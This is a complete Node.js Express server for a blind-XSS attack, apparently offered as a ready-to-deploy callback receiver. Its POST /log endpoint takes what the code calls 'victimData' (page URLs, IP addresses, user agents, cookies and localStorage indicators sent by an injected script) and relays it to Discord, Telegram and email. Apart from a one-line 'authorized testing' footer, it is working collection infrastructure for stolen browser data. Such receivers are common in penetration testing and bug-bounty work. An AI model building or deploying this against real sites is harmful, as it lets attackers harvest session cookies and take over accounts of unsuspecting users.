const express = require('express');
const fetch = require('node-fetch');
const nodemailer = require('nodemailer');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const config = {
    discordWebhook: process.env.DISCORD_WEBHOOK_URL,
    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN,
    telegramChatId: process.env.TELEGRAM_CHAT_ID,
    adminEmail: process.env.ADMIN_EMAIL,
    emailPassword: process.env.EMAIL_PASSWORD, 
    emailService: process.env.EMAIL_SERVICE || 'gmail',
    port: process.env.PORT || 3000
};

async function sendDiscordAlert(data) {
    if (!config.discordWebhook) {
        console.log('Discord: Webhook not configure');
        return false;
    }
    
    const embed = {
        title: "🚨 BLIND XSS FOUND",
        color: 0xff0000,
        timestamp: data.timestamp,
        fields: [
            { name: "🌐 FULL URL", value: `\`\`\`${data.url.substring(0, 1000)}\`\`\``, inline: false },
            { name: "📡 IP ADDRESS", value: `\`${data.publicIp}\``, inline: true },
            { name: "👤 User Agent", value: `\`\`\`${data.userAgent.substring(0, 500)}\`\`\``, inline: false },
            { name: "🍪 Cookies", value: data.cookies ? `\`\`\`${data.cookies.substring(0, 500)}\`\`\`` : 'Unavailable', inline: false },
            { name: "📝 LocalStorage", value: data.localStorage && data.localStorage.length > 10 ? 'Data Available' : 'Unavailable', inline: true },
            { name: "🖥️ Screen", value: data.screen || 'Unknown', inline: true }
        ],
        footer: { text: `Blind XSS Monitor • ${new Date().toLocaleString('id-ID')}` }
    };
    
    try {
        const response = await fetch(config.discordWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log(`Discord: Sending Notification, status: ${response.status}`);
        return response.ok;
    } catch (error) {
        console.error('Discord: Failed sending:', error.message);
        return false;
    }
}

async function sendTelegramAlert(data) {
    if (!config.telegramBotToken || !config.telegramChatId) {
        console.log('Telegram: Token or Chat ID not configure');
        return false;
    }
    
    const message = `
🚨 *BLIND XSS FOUND*
⏰ *Timestamp:* ${new Date(data.timestamp).toLocaleString('id-ID')}
🌐 *FULL URL:* ${data.url.substring(0, 200)}
📡 *IP Address:* ${data.publicIp}
👤 *Browser:* ${data.userAgent.split(')')[0].split('(')[1] || data.userAgent.substring(0, 50)}
🍪 *Cookies:* ${data.cookies ? 'Yes' : 'No'}
🖥️ *Screen:* ${data.screen}
    
_Full data available on server log._
    `;
    
    try {
        const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.telegramChatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const result = await response.json();
        console.log(`Telegram: Sending Notification, OK: ${result.ok}`);
        return result.ok;
    } catch (error) {
        console.error('Telegram: Seding Failed', error.message);
        return false;
    }
}

async function sendEmailAlert(data) {
    if (!config.adminEmail || !config.emailPassword) {
        console.log('Email: Configuration not complete');
        return false;
    }
    
    const transporter = nodemailer.createTransport({
        service: config.emailService,
        auth: {
            user: config.adminEmail,
            pass: config.emailPassword
        }
    });
    
    const mailOptions = {
        from: `"Blind XSS Monitor" <${config.adminEmail}>`,
        to: config.adminEmail,
        subject: `🚨 Blind XSS Alert - ${new Date().toLocaleString('id-ID')}`,
        html: `
            <h2>🚨 Blind XSS Payload Triggered</h2>
            <p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString('id-ID')}</p>
            <p><strong>URL Target:</strong> <a href="${data.url}">${data.url}</a></p>
            <p><strong>IP Address:</strong> ${data.publicIp}</p>
            <p><strong>User Agent:</strong> ${data.userAgent}</p>
            <hr>
            <h3>📊 Data:</h3>
            <p><strong>Cookies:</strong> ${data.cookies ? 'Available (' + data.cookies.split(';').length + ' cookies)' : 'Unavailable'}</p>
            <p><strong>LocalStorage:</strong> ${data.localStorage && data.localStorage.length > 10 ? 'Available' : 'Unavailable'}</p>
            <p><strong>Screen:</strong> ${data.screen}</p>
            <hr>
            <p><small>Sending from Blind XSS Monitoring System</small></p>
        `
    };
    
    try {
        const info = await transporter.sendMail(mailOptions);
        console.log(`Email: Sent to ${config.adminEmail}, ID: ${info.messageId}`);
        return true;
    } catch (error) {
        console.error('Email: Failed:', error.message);
        return false;
    }
}

app.post('/log', async (req, res) => {
    console.log('\n' + '='.repeat(50));
    console.log('📥 Receiving data...');
    
    const victimData = req.body;
    
    console.log(`🌐 URL: ${victimData.url}`);
    console.log(`📡 IP: ${victimData.publicIp}`);
    console.log(`👤 UA: ${victimData.userAgent?.substring(0, 80)}...`);
    console.log(`🍪 Cookies: ${victimData.cookies ? victimData.cookies.split(';').length + ' items' : 'None'}`);
    
    const notifications = await Promise.allSettled([
        sendDiscordAlert(victimData),
        sendTelegramAlert(victimData),
        sendEmailAlert(victimData)
    ]);
    
    const results = {
        discord: notifications[0].status === 'fulfilled' ? notifications[0].value : false,
        telegram: notifications[1].status === 'fulfilled' ? notifications[1].value : false,
        email: notifications[2].status === 'fulfilled' ? notifications[2].value : false
    };
    
    console.log('📤 Hasil notifikasi:', results);
    console.log('='.repeat(50) + '\n');
    
    req.app.locals.lastTrigger = {
        time: new Date(),
        data: {
            url: victimData.url,
            ip: victimData.publicIp
        }
    };
    
    res.status(200).json({
        status: 'success',
        message: 'Data diterima dan notifikasi dikirim',
        notifications: results,
        received: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        service: 'blind-xss-monitor',
        uptime: process.uptime(),
        lastTrigger: req.app.locals.lastTrigger || 'None',
        environment: process.env.NODE_ENV || 'development'
    });
});

app.get('/', (req, res) => {
    res.send(`
        <h1>🚨 Blind XSS Monitoring Backend</h1>
        <p>Backend active and ready receiving data from payload.</p>
        <p><strong>Endpoint:</strong> POST <code>/log</code></p>
        <p><a href="/health">Health Check</a></p>
        <hr>
        <p><small>Use for testing authorized.</small></p>
    `);
});


app.listen(config.port, () => {
    console.log(`
╔═════════════════════════════════════════════════════════════════════════════╗
║    🚨 BLIND XSS MONITORING BACKEND                                           ║
║    🔧 Port: ${config.port}                                                   ║
║    📅 ${new Date().toLocaleString('id-ID')}                                  ║
║                                                                              ║
║    📍 Discord: ${config.discordWebhook ? '✅' : '❌'}                         ║
║    📍 Telegram: ${config.telegramBotToken ? '✅' : '❌'}                      ║
║    📍 Email: ${config.adminEmail ? '✅' : '❌'}                               ║
╚══════════════════════════════════════════════════════════════════════════════╝
    `);
    console.log(`Server berjalan: http://localhost:${config.port}`);
});